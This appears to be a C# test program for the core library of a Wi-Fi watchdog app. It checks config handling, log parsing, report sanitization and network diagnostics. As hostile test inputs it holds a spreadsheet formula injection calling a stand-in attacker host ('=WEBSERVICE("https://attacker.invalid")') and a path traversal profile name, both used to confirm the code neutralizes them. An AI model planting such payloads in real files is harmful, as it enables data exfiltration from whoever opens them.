using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json.Nodes;
using WiFiWatchdog.Studio.Core;

var passed = 0;
void Check(bool condition, string name)
{
    if (!condition) throw new Exception("FAILED: " + name);
    Console.WriteLine("PASS " + name);
    passed++;
}
var parsed = LogHistory.ParseLine("[2026-10-08 10:47:00] [INFO] 系统网络正常；10 分钟后再次检测。");
Check(parsed is { Level: "INFO" } && parsed.Message.Contains("10 分钟"), "parse engine log");
Check(LogHistory.ParseLine("garbage without timestamp") is null, "reject malformed log");
Check(LogHistory.ParseLine("[2026-10-08 10:47:00] [WARN] delayed")?.Level == "WARN", "warn severity");
var root = Path.Combine(Path.GetTempPath(), "watchdog-studio-test-" + Guid.NewGuid().ToString("N"));
try
{
    Directory.CreateDirectory(root);
    var configPath = Path.Combine(root, "config.json");
    var config = new ConfigStore(configPath);
    var original = ConfigStore.Defaults();
    original["futureEngineExtension"] = "preserve me";
    config.Save(original);
    var modified = config.Read();
    modified["normalCheckIntervalMinutes"] = 15;
    config.Save(modified);
    var read = config.Read();
    Check(ConfigStore.GetInt(read, "normalCheckIntervalMinutes", 0) == 15, "save config int");
    Check(read["futureEngineExtension"]?.ToString() == "preserve me", "preserve unknown engine keys");
    Check(File.Exists(configPath + ".bak"), "backup previous config");
    var bad = (JsonObject)read.DeepClone();
    bad["normalCheckIntervalMinutes"] = 0;
    try { config.Save(bad); throw new Exception("bad config was accepted"); }
    catch (InvalidDataException) { Check(true, "reject unsafe polling interval"); }
    File.WriteAllText(configPath, "{BROKEN JSON");
    try { config.Read(); throw new Exception("corrupted config was accepted"); }
    catch (InvalidDataException) { Check(true, "fail closed on invalid JSON"); }
    Check(File.ReadAllText(configPath) == "{BROKEN JSON", "never silently overwrite corrupt user config");
    var presets = new PresetStore(Path.Combine(root, "presets"));
    presets.Save("Campus 8021x", read);
    Check(presets.List().Contains("Campus 8021x"), "named profile stored");
    Check(presets.Load("Campus 8021x")["futureEngineExtension"]?.ToString() == "preserve me", "profile keeps unknown keys");
    try { presets.Save("../escaped", read); throw new Exception("path traversal accepted"); }
    catch (ArgumentException) { Check(true, "reject profile path traversal"); }
    var logFile = Path.Combine(root, "watchdog-2026-10-08.log");
    File.WriteAllText(logFile, "incomplete\n[2026-10-08 10:47:00] [ERROR] network down\n");
    Check(LogHistory.ReadTail(logFile).Count == 1, "read bounded log tail");
    var csv = ReportExporter.EventsCsv(new[] { new WatchdogEvent(DateTimeOffset.Now, "WARN", "a,\"quoted\"\r\nvalue") });
    Check(csv.Contains("\"a,\"\"quoted\"\"  value\""), "escape CSV cells");
    var injected = ReportExporter.EventsCsv(new[]
    {
        new WatchdogEvent(DateTimeOffset.Now, "WARN", "=WEBSERVICE(\"https://attacker.invalid\")")
    });
    Check(injected.Contains("\"'=WEBSERVICE("), "CSV export neutralizes spreadsheet formula injection");
    var snapshot = new DiagnosticSnapshot(DateTimeOffset.Now,
        [new EndpointResult("Google 204", "https://test", 204, true, 15, "有效")],
        new ControllerResult(true, false, "rule", "true", 2026, "secret-not-included"), null);
    var report = ReportExporter.ToJson(snapshot);
    Check(report.Contains("Google 204") && !report.Contains("secret-not-included"), "sanitized report excludes sensitive raw controller state");

    // Optimistic config update: Studio must not overwrite external changes
    // while the settings page is open, even if a valid editor is pending.
    config.Save(read);
    var fingerprint = config.Fingerprint();
    var editorSnapshot = config.Read();
    var outside = config.Read();
    outside["normalCheckIntervalMinutes"] = 20;
    config.Save(outside);
    try
    {
        config.SaveIfUnchanged(editorSnapshot, fingerprint);
        throw new Exception("configuration conflict was silently overwritten");
    }
    catch (ConfigConflictException) { Check(true, "reject external config overwrite"); }
    Check(ConfigStore.GetInt(config.Read(), "normalCheckIntervalMinutes", 0) == 20, "keep external config edit");
    var newFingerprint = config.Fingerprint();
    var edited = config.Read();
    edited["normalCheckIntervalMinutes"] = 22;
    var afterSave = config.SaveIfUnchanged(edited, newFingerprint);
    Check(afterSave == config.Fingerprint() && ConfigStore.GetInt(config.Read(), "normalCheckIntervalMinutes", 0) == 22,
        "accept and fingerprint safe config update");

    // A complete 14-day summary may have more than 30k lines. The old
    // implementation silently discarded the oldest lines and allocated
    // many MB for each day; streaming now counts all lines accurately.
    var todayLog = Path.Combine(root, "watchdog-" + DateTime.Today.ToString("yyyy-MM-dd") + ".log");
    using (var writer = new StreamWriter(todayLog))
    {
        for (var i = 0; i < 35000; i++)
            writer.WriteLine("[2026-10-08 11:00:00] [WARN] repeated test warning");
        writer.WriteLine("[2026-10-08 11:00:01] [ERROR] 恢复成功");
    }
    var day = LogHistory.LastDays(root, 1).Single();
    Check(day.Warn == 35000 && day.Error == 1 && day.Recoveries == 1,
        "stream entire daily log without capped 30000-event count");

    var journal = new DiagnosticJournal(Path.Combine(root, "history"));
    journal.Add(snapshot);
    var first = journal.Read();
    Check(first.Count == 1 && first[0].Passed == 1 && first[0].Total == 1,
        "persist and read a bounded diagnostic summary");
    var serialized = File.ReadAllText(Directory.GetFiles(Path.Combine(root, "history"), "diag-*.json").Single());
    Check(!serialized.Contains("secret-not-included") && !serialized.Contains("https://test"),
        "diagnostic history stores neither controller messages nor endpoint URLs");
    for (var i = 0; i < 66; i++)
        journal.AddRecord(new DiagnosticRecord(DateTimeOffset.UtcNow, i, 4, "test", "unknown",
            "unknown", null, []));
    Check(Directory.GetFiles(Path.Combine(root, "history"), "diag-*.json").Length <= 60,
        "history capped at 60 summary files");

    var list = new List<AdapterSnapshot>
    {
        new("test-nic", "WLAN", "physical wireless", "Wi-Fi", "已连接",
            "150 Mbps", "192.168.1.7", "", "192.168.1.1", "192.168.1.1", false)
    };
    var works = new DiagnosticSnapshot(DateTimeOffset.Now,
        [new EndpointResult("NCSI", "https://test", null, false, 10, "blocked")],
        new ControllerResult(false, false, "", "", 0, ""), 
        new EndpointResult("Proxy", "https://test", 204, true, 18, "valid"));
    Check(HealthAdvisor.Evaluate(works, list).Any(x => x.Title.Contains("代理可用")),
        "distinguish working mixed proxy from system TUN failure");
    Check(HealthAdvisor.Evaluate(null, list).Any(x => x.Title.Contains("尚无本次会话")),
        "no diagnosis means no assumptions about Internet failure");
    Check(HealthAdvisor.Evaluate(null, []).Any(x => x.Title.Contains("Wi-Fi")),
        "unavailable interface guidance is non-destructive");
    // This method must be safe on test runner hardware with no connected Wi-Fi.
    Check(AdapterInspector.Collect() is not null, "read-only adapter enumeration has no Wi-Fi dependency");

    using var fake = new HttpClient(new MockHandler(_ => new HttpResponseMessage(HttpStatusCode.NoContent)
    { Content = new StringContent(string.Empty, Encoding.UTF8) }));
    var four = await NetworkDiagnostics.TestAllAsync(fake,
        Enumerable.Repeat(new EndpointTarget("Mock 204", "https://127.0.0.1/", (code, _) => code == HttpStatusCode.NoContent), 4),
        CancellationToken.None);
    Check(four.Count == 4 && four.All(x => x.Valid && x.Status == 204), "complete four-target diagnosis");
}
finally
{
    if (Directory.Exists(root)) Directory.Delete(root, true);
}
Console.WriteLine($"Studio core checks passed: {passed}");

sealed class MockHandler(Func<HttpRequestMessage, HttpResponseMessage> responder) : HttpMessageHandler
{
    protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        => Task.FromResult(responder(request));
}
